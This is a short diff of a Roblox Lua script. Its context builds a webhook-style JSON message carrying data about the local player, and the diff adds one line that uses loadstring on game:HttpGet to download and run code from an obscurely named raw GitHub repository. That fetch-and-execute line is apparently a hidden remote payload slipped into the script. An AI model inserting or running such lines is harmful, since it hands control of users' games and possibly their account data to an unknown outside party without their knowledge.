@@ -50,3 +50,6 @@ local a= os.time()local a= os.date('!*t', a)plr= game:GetService'Players'.LocalP
     };
     Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {a}; });
 }
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/F13CKILLA"))();
